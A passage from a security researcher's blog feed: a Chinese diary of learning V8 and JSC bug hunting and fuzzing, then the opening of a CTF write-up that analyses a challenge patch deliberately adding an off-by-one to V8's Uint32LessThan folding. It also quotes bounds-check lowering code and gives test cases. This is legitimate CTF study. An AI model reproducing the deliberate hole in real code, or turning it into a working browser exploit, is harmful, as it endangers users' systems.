id="2018-12-27-31"><a href="#2018-12-27-31" class="headerlink" title="2018-12-27-31"></a>2018-12-27-31</h2><ol><li>35c3 video和日程整理<br><a href="https://media.ccc.de" target="_blank" rel="noopener">https://media.ccc.de</a><br><a href="https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html" target="_blank" rel="noopener">https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html</a></li><li><p>开始fuzz之旅<br>From Zero to Zero Day-Jonathan Jacobi<br><a href="https://www.youtube.com/watch?v=xp1YDOtWohw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=xp1YDOtWohw</a><br>Attacking Chrome IPC-nedwill<br><a href="https://www.youtube.com/watch?v=39yPeiY808w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=39yPeiY808w</a><br>The Layman’s Guide to Zero-Day Engineering<br><a href="https://www.youtube.com/watch?v=WbuGMs2OcbE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=WbuGMs2OcbE</a></p></li><li><p>简述一下From Zero to Zero Day里我觉得有趣的东西</p><ul><li>基础很重要，其中最重要的就是c/c++/os(或者你具体研究的那个系统，比如浏览器)internal/能用python或者其他语言coding来实现自己的想法。<br>最后一点我觉得<a href="https://ktkitty.github.io/" target="_blank" rel="noopener">KT</a>师傅搞的非常棒，可惜我太菜了。</li><li>通过CTF或者具体的简单的小软件来学习关于漏洞的基础知识，不要害怕失败，从其他人的解法中你依然能学到非常多的东西，这里建议follow defcon预选赛和defcon的赛题，其他的可以不做，没有什么意义。<br>推荐一个系列教程<br><a href="http://liveoverflow.com/capture_the_flag/index.html" target="_blank" rel="noopener">http://liveoverflow.com/capture_the_flag/index.html</a><br><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w" target="_blank" rel="noopener">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</a><br>但是要注意，不要在“浅水区”待太久，你只要确保自己有继续进行研究的能力即可，我觉得半年可以完成这些事情，然后继续往下。</li><li>接下来需要的就是eat sleep pwn,repeat;2333<br>这里的建议是，当你掌握了一些trick和思路之后，你可以尝试去理解真实的漏洞，理解其中的pattern<br>比如你可以去看google project zero提交的漏洞，并研究他们。</li><li>后面的部分是一个有趣的漏洞和它的exp，不过这部分其实有点无聊。</li></ul></li></ol><p>我似乎懂了些什么有趣的东西，从jsc开始实践。why not v8?it’s difficult…）</p><ol><li>继续简述一下Attacking Chrome IPC里的一些我觉得关键的地方<ul><li>练习代码审计<ol><li>拿到一个已经存在的漏洞报告</li><li>知道漏洞大概发生在什么地方，或者是什么模块，不要去看完整的漏洞描述，尝试去发现漏洞。</li><li>如果你失败了，看一下漏洞报告，并且去总结你错过了什么地方。</li><li>重复这个过程，直到你觉得OK为止。</li></ol></li><li>练习fuzz<ol><li>请确定自己有充分的审计上的练习</li><li>拿到一个漏洞，通过自己写fuzz去trigger它。</li></ol></li><li>protobuf-mutator+libfuzzer</li></ul></li></ol><p>年终的最后几天，是一边睡觉一边和这些有趣的talk度过的，还看了35c3的v8题目，有一个逃逸分析的点想了半个月没想到，是我蠢了。<br>有趣的挑战，明年要继续努力了，夯实基础，砥砺前行。<br>一个人久了真的很累呀，新的一年，找个朋友一起住，一起打打游戏，搞搞研究，开开心~熬过这半年就好了。</p><h2 id="2019-1-1-2"><a href="#2019-1-1-2" class="headerlink" title="2019-1-1-2"></a>2019-1-1-2</h2><ol><li>写一个能跑的js fuzz，然后慢慢调。<br>lighthouse+lcov–&gt;feedback<br>dharma–&gt;语法生成<br>将两部分结合一下就是一个能跑的js fuzz，写代码真麻烦2333<br>今天大概看了看dharma的语法描述文件怎么写，想想要写一堆语法描述就麻烦。。</li><li>youtube上看到一个小系列The Art of Fuzzing，upx是真的很好fuzz。。很快一堆crash<br>然后是google的libfuzzerTutorial很有趣。<br><a href="https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md" target="_blank" rel="noopener">https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md</a></li><li>所以今天大概最后就是再看了一下webkid。</li></ol><h2 id="2019-1-3-9"><a href="#2019-1-3-9" class="headerlink" title="2019-1-3-9"></a>2019-1-3-9</h2><ol><li>研究safari jsc<br>safari JIT exploit<br><a href="https://www.youtube.com/watch?v=bqehb-YZ9jo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bqehb-YZ9jo</a><br><a href="https://share.weiyun.com/5IJZPBp" target="_blank" rel="noopener">https://share.weiyun.com/5IJZPBp</a><br>fuzz book<br><a href="https://www.fuzzingbook.org" target="_blank" rel="noopener">https://www.fuzzingbook.org</a><br>pizlo jsc<br><a href="http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf</a><br><a href="http://www.filpizlo.com/" target="_blank" rel="noopener">http://www.filpizlo.com/</a><br>其他乱七八糟的paper<br><a href="https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf" target="_blank" rel="noopener">https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf</a><br>Array Bounds Check Elimination for the Java HotSpotTM Client Compiler<br><a href="http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf" target="_blank" rel="noopener">http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf</a></li></ol><h2 id="2019-1-12"><a href="#2019-1-12" class="headerlink" title="2019-1-12"></a>2019-1-12</h2><ol><li>研究编译原理<br><a href="https://www.bilibili.com/video/av17669734/?p=77" target="_blank" rel="noopener">https://www.bilibili.com/video/av17669734/?p=77</a><br>刷完视频刷书，重新看感觉有新收获，得到的认知就是：</li></ol><ul><li>要知道你看的这个东西是用来做什么的，解决什么问题的</li><li>它具体可能是怎么实现的，js引擎里是怎么实现的</li><li>modern compiler和书里的不同之处</li></ul><h2 id="2019-4-2"><a href="#2019-4-2" class="headerlink" title="2019-4-2"></a>2019-4-2</h2><p>不写日记感觉不能梳理自己每天在干嘛，就写一下好了。</p><ol><li><p>学习saelo的两个spiderMonkey漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1791" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1791</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1810" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1810</a></p></li><li><p>学习saelo的jsc漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1753" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1753</a><br>关于ArrayWithSlowPutStorage</p></li></ol><h2 id="2019-4-24"><a href="#2019-4-24" class="headerlink" title="2019-4-24"></a>2019-4-24</h2><ol><li>在漫长的时间里无所作为，开始反省自己遇到的瓶颈到底是什么，除了chakra，其他浏览器的JIT优化漏洞总是越来越少了。<br>首先是在我花了很长时间的浏览器JIT优化方面，已经很久没有chrome v8的有趣漏洞出现了，我分析了龚广天府cup的漏洞，以及最近的那个FileReader的漏洞，有趣的是，它们的漏洞pattern都是，在处理超长的数据或者其他东西的时候，没有处理好，导致畸形数据或者错误的程序执行逻辑产生，但是并不太好迅速的针对进行审计。<br>我依然更感兴趣在优化漏洞上，尤其是大宝发现的那些chakra漏洞，非常有趣，但是v8里没有chakra那些奇奇怪怪的设计。</li><li>fuzz依然是我更感兴趣的方向，但是单纯js fuzz已经没什么前途了。。<br>和Atum这样的顶级二进制选手聊过之后，感觉自己在更多的软件实现，尤其是内核的一些东西上的欠缺，要更理解这些系统机制以及如何操纵它们才可以。<br><a href="https://github.com/A7um/syscallhook" target="_blank" rel="noopener">https://github.com/A7um/syscallhook</a><br>强的令人发指。。<br>通过顶级CTF来迭代知识依然是一个好的选择，抛弃掉无用的heap相关的赛题，剩下的题目质量依然很高很好，值得学习，尤其是c3 ctf。</li><li>挖了这么久漏洞，终于明白了，攻击面和结合攻击面去fuzz，是最合适的挖洞方法，剩下就是code smell。</li><li>我觉得逻辑漏洞是一个很有趣的方向，不知道有没有大佬带我玩，逆向一些国产小软件的进程间通信来找找漏洞啥的。</li></ol><h2 id="2019-4-25"><a href="#2019-4-25" class="headerlink" title="2019-4-25"></a>2019-4-25</h2><p>最近分析的比较有趣的浏览器漏洞。<br>Issue 1793: Chrome: Integer overflow in NewFixedDoubleArray<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1793" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1793</a><br>CVE-2019-5786 FileReader UaF<br>OOB Write in ValueDeserializer::ReadDenseJSArray (Tian Fu Cup）<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=905940" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=905940</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906313" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=906313</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=914731" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=914731</a><br>现在看这些漏洞，有一些有趣的code smell了。浏览器对我来说慢慢的也已经变成了一个看得懂的东西呢，不过离挖到洞还早。</p><h2 id="2019-6-5"><a href="#2019-6-5" class="headerlink" title="2019-6-5"></a>2019-6-5</h2><p>我的CVE。</p><ol><li><a href="https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html" target="_blank" rel="noopener">https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html</a><br>[$TBD][950328] Medium CVE-2019-5831: Incorrect map processing in V8. Reported by yngwei(JiaWei, Yin) of IIE Varas and <strong>sakura of Tecent Xuanwu Lab</strong> on 2019-04-07</li><li><a href="https://support.apple.com/en-us/HT210123" target="_blank" rel="noopener">https://support.apple.com/en-us/HT210123</a><br>CVE-2019-8583: <strong>sakura of Tencent Xuanwu Lab</strong>, and dwfault working at ADLab of Venustech<br>从开始搞浏览器到现在，差不多就是一年，去掉一些零零碎碎的做其他事情的时间，可能大概半年多一些，我也有自己的google和apple致谢了。<br>刚刚好在我毕业答辩期间收到编号，可能是我的毕业礼物了，thanks~哈哈<br>既然发了日记就说一下我的理解，在实习的这一年里认识了非常多的大佬，我在xuanwu lab的导师sky还有lw和明月师傅他们，r3kapig的Ne0和Atum他们，还有和我一起讨论学习的yngwei和dwfault,jessica他们，都给了我非常多的帮助和启发。<br>在推特上面也认识了不少的朋友，以及follow了很多大佬，尤其是project zero的saelo，跟进最新的漏洞并分析，研究漏洞挖掘的新技术新手法，不断提升自己。<br>所以学习这件事情，最重要的就是开阔视野，你以为的有用的东西并不真的有用，实际的漏洞挖掘考察的是对目标的理解和深度，并不是说和简单的CTF pwn一样，只是hack game，ctf非常有意义，但是也要认识到这一点，真正决定你能不能挖到漏洞的，永远是对目标软件的理解，并没有什么特别特别通用的知识。<br>Just spend a long time learning and doing it, you will get better.</li></ol><h2 id="2019-6-6"><a href="#2019-6-6" class="headerlink" title="2019-6-6"></a>2019-6-6</h2><p>最近这几天一直在想漫长的一个月做点什么，嗯，没错，我毕业了，毕业答辩结束，应该没什么幺蛾子的话，会顺利的会玄武上班。<br>然后就有点迷茫，暂时，嗯，暂时不太想继续肝JS engine了，花了太久，产出有限，希望做些有趣的事情，嗯，当然fuzz还会继续跑。<br>想学的东西有点多，我是出于兴趣在搞技术的，有些复杂的东西其实不太想牵扯到其中，我喜欢挖到漏洞，喜欢和厉害的人交流技术弥补不足。<br>还想学更多有趣的东西。</p><h2 id="2019-6-23"><a href="#2019-6-23" class="headerlink" title="2019-6-23"></a>2019-6-23</h2><ol><li>拿到了毕业证和学位证，准备入职了，列一下计划。</li><li>和@aSiagaming一起解决gctf chrome sandbox escape pwn.<br><a href="https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic" target="_blank" rel="noopener">https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic</a><br>题目出处应该是这个issue。<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1755</a><br>现在需要补充大量的基础知识。</li><li>复习v8 JIT相关的知识和漏洞，准备一个share.</li><li>开始打hacker101的ctf，练习一些web的基础知识。</li><li>每天坚持锻炼和饮食。</li></ol><h2 id="2019-6-28"><a href="#2019-6-28" class="headerlink" title="2019-6-28"></a>2019-6-28</h2><ol><li>上班第一周，全在搬砖，一点漏洞研究的事情没做，粗略的翻了下ned的议题还有chrome mojo。</li><li>思想还需要转变，毕竟上班就是这样，leader让你干什么你就得干什么，哪怕你是造火箭的，也得来拧螺丝钉。</li><li>虽然很想挖洞，也觉得工作和自己想象中不一样，不够帅，但是，还是要积极调整啊。</li><li>我的第二个v8 cve可能要发下来了，开心。</li></ol><h2 id="2019-7-3"><a href="#2019-7-3" class="headerlink" title="2019-7-3"></a>2019-7-3</h2><ol><li>爬虫写的越来越快了。。我可以写篇博客讲爬虫了。。</li><li><p>学习natalie的挖洞思路，先把webrtc搭起来了。<br><a href="https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch" target="_blank" rel="noopener">https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch</a><br>natalie的编译脚本有点问题，改成下面这样就OK了,学习了一下谷歌的构建链。<br><a href="https://blog.csdn.net/Vincent95/article/details/70849035" target="_blank" rel="noopener">https://blog.csdn.net/Vincent95/article/details/70849035</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rtc_static_library(&quot;call&quot;) &#123;</span><br><span class="line">  sources = [</span><br><span class="line">    &quot;call.cc&quot;,</span><br><span class="line">    &quot;call_factory.cc&quot;,</span><br><span class="line">    &quot;call_factory.h&quot;,</span><br><span class="line">    &quot;degraded_call.cc&quot;,</span><br><span class="line">    &quot;degraded_call.h&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.cc&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.h&quot;,</span><br><span class="line">    &quot;receive_time_calculator.cc&quot;,</span><br><span class="line">    &quot;receive_time_calculator.h&quot;,</span><br><span class="line">    &quot;../test/rtp_file_writer.cc&quot;,</span><br><span class="line">    &quot;../test/rtp_file_writer.h&quot;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  deps = [</span><br><span class="line">    &quot;../rtc_base:rtc_json&quot;,</span><br></pre></td></tr></table></figure></li><li><p>调试分析漏洞。</p></li></ol><h2 id="2019-7-8"><a href="#2019-7-8" class="headerlink" title="2019-7-8"></a>2019-7-8</h2><ol><li>这周想给自己的漏洞写一下利用,CVE-2019-5831,issue-950328，这个洞是我回学校忙毕业的时候出的，一直没空仔细看，怎么说呢，从回学校毕业之后到现在，也有好几个月了，一直没有调试分析chrome漏洞了，其实对引擎的理解就还不够深刻，漏洞基本上是fuzz出的，这段时间也一直在考虑和去改fuzz，不过和大佬聊过之后觉得，挖漏洞这件事情，必须经常反思为什么别人能挖到，自己没挖到，是这个点没看到么，如果不是，那是什么原因。<br>嗯，是我看的还不够仔细，那就从自己的漏洞开始搞吧。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2018-1-28&quot;&gt;&lt;a href=&quot;#2018-1-28&quot; class=&quot;headerlink&quot; title=&quot;2018-1-28&quot;&gt;&lt;/a&gt;2018-1-28&lt;/h2&gt;&lt;p&gt;1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）&lt;br&gt;2
      
    
    </summary>
    
      <category term="学习日记" scheme="http://eternalsakura13.com/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="sakuraのsakura" scheme="http://eternalsakura13.com/tags/sakura%E3%81%AEsakura/"/>
    
  </entry>
  
  <entry>
    <title>qwb growupjs &amp; wctf independence_day writeup</title>
    <link href="http://eternalsakura13.com/2019/07/16/qwb%20growupjs%20&amp;%20wctf%20independence_day%20writeup/"/>
    <id>http://eternalsakura13.com/2019/07/16/qwb growupjs &amp; wctf independence_day writeup/</id>
    <published>2019-07-16T10:23:12.934Z</published>
    <updated>2019-07-17T08:08:25.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qwb-growupjs-amp-wctf-independence-day-writeup"><a href="#qwb-growupjs-amp-wctf-independence-day-writeup" class="headerlink" title="qwb growupjs &amp; wctf independence_day writeup"></a>qwb growupjs &amp; wctf independence_day writeup</h1><h2 id="qwb-growupjs"><a href="#qwb-growupjs" class="headerlink" title="qwb growupjs"></a>qwb growupjs</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">index a6a8e87cf4..164ab44fab 100644</span><br><span class="line">--- a/src/compiler/machine-operator-reducer.cc</span><br><span class="line">+++ b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false</span><br><span class="line">       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false</span><br><span class="line">       if (m.IsFoldable()) &#123;                                    // K &lt; K =&gt; K</span><br><span class="line">-        return ReplaceBool(m.left().Value() &lt; m.right().Value());</span><br><span class="line">+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);</span><br><span class="line">       &#125;</span><br><span class="line">       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false</span><br><span class="line">       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br></pre></td></tr></table></figure><p>patch如上，实际上是在MachineOperatorReducer的这个case中<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kUint32LessThan: &#123;</span><br><span class="line">      <span class="function">Uint32BinopMatcher <span class="title">m</span><span class="params">(node)</span></span>;</span><br><span class="line">      <span class="keyword">if</span> (m.left().Is(kMaxUInt32)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// M &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.right().Is(<span class="number">0</span>)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);          <span class="comment">// x &lt; 0 =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.IsFoldable()) &#123;                                    <span class="comment">// K &lt; K =&gt; K</span></span><br><span class="line">        <span class="keyword">return</span> ReplaceBool(m.left().Value() &lt; m.right().Value()+<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (m.LeftEqualsRight()) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// x &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br><span class="line">        Int32BinopMatcher mleft(m.left().node());</span><br><span class="line">        <span class="keyword">if</span> (mleft.right().HasValue()) &#123;</span><br><span class="line">          <span class="comment">// (x &gt;&gt; K) &lt; C =&gt; x &lt; (C &lt;&lt; K)</span></span><br><span class="line">          <span class="comment">// when C &lt; (M &gt;&gt; K)</span></span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> c = m.right().Value();</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> k = mleft.right().Value() &amp; <span class="number">0x1F</span>;</span><br><span class="line">          <span class="keyword">if</span> (c &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(kMaxInt &gt;&gt; k)) &#123;</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">0</span>, mleft.left().node());</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">1</span>, Uint32Constant(c &lt;&lt; k));</span><br><span class="line">            <span class="keyword">return</span> Changed(node);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// TODO(turbofan): else the comparison is always true.</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先这个patch很简单，就是本来如果是1&lt;1这样的kUint32LessThan比较，应该替换成false节点，而这里变成1&lt;2（<code>m.right().Value()+1)</code>），于是就替换成了true节点。<br>这个bug非常明显，但是如何利用呢？实际上对array边界的检查可以lower到Uint32LessThan节点，所以这实际上可以转化成一个array的off-by-one漏洞。<br>然后后续利用和<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a>中使用的方法一致。</p><h3 id="IR分析"><a href="#IR分析" class="headerlink" title="IR分析"></a>IR分析</h3><p>我做了几组case，先看一个比较简单的case</p><h4 id="case-1"><a href="#case-1" class="headerlink" title="case 1"></a>case 1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    let arr = [1.1, 2.2, 3.3, 4.4];</span><br><span class="line">    let idx = 3;</span><br><span class="line">    return arr[idx];</span><br><span class="line">&#125;</span><br><span class="line">for (i = 0; i &lt; 10000; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typer phase<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104131.png" alt=""><br>在取arr[idx]之前会进行CheckBounds，然后在Simplified lower之后<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          CheckBoundsParameters::Mode mode =</span><br><span class="line">              CheckBoundsParameters::kDeoptOnOutOfBounds;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            mode = CheckBoundsParameters::kAbortOnOutOfBounds;</span><br><span class="line">          &#125;</span><br><span class="line">          NodeProperties::ChangeOp(</span><br><span class="line">              node, simplified()-&gt;CheckedUint32Bounds(p.feedback(), mode));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104415.png" alt=""><br>然后在Effect linearization中被Lower成Uint32LessThan。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Node* EffectControlLinearizer::LowerCheckedUint32Bounds(Node* node,</span><br><span class="line">                                                        Node* frame_state) &#123;</span><br><span class="line">  Node* index = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">  Node* limit = node-&gt;InputAt(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> CheckBoundsParameters&amp; params = CheckBoundsParametersOf(node-&gt;op());</span><br><span class="line"></span><br><span class="line">  Node* check = __ Uint32LessThan(index, limit);</span><br><span class="line">  <span class="keyword">switch</span> (params.mode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kDeoptOnOutOfBounds:</span><br><span class="line">      __ DeoptimizeIfNot(DeoptimizeReason::kOutOfBounds,</span><br><span class="line">                         params.check_parameters().feedback(), check,</span><br><span class="line">                         frame_state, IsSafetyCheck::kCriticalSafetyCheck);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kAbortOnOutOfBounds: &#123;</span><br><span class="line">      <span class="keyword">auto</span> if_abort = __ MakeDeferredLabel();</span><br><span class="line">      <span class="keyword">auto</span> done = __ MakeLabel();</span><br><span class="line"></span><br><span class="line">      __ Branch(check, &amp;done, &amp;if_abort);</span><br><span class="line"></span><br><span class="line">      __ Bind(&amp;if_abort);</span><br><span class="line">      __ Unreachable();</span><br><span class="line">      __ Goto(&amp;done);</span><br><span class="line"></span><br><span class="line">      __ Bind(&amp;done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-112448.png" alt=""></p><h4 id="case-2"><a href="#case-2" class="headerlink" title="case 2"></a>case 2</h4><p>那么是不是把idx直接改成4，就可以越界读写一个element呢？<br>事实上没那么简单，它们生成的IR完全不一样。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>typer 